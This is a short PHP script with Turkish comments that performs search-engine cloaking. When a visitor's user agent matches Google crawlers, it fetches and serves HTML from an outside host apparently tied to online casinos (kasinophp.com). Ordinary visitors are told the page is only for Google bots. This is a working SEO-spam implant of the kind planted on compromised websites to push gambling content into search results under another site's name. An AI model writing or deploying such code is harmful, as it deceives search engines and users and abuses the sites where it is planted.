<?php

// — Google bot kontrolü —
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (preg_match(
    '/(Googlebot|google|Googlebot-(Image|News|Video|Mobile|Smartphone|Favicon)|DuplexWeb-Google|Google-Structured-Data-Testing-Tool|APIs-Google|Mediapartners-Google)/i',
    $userAgent
)) {
    $remoteUrl = "https://canli1.kasinophp.com/amp.php";
    $content   = @file_get_contents($remoteUrl);

    if ($content !== false) {
        if (ob_get_length() !== false) {
            ob_end_clean();
        }
        header('Content-Type: text/html; charset=utf-8');
        echo $content;
        exit;
    }

    http_response_code(404);
    exit('Uzak dosya bulunamadı.');
}

// Normal kullanıcıya gösterilecek içerik
exit('Bu sayfa sadece Google botlar içindir.');
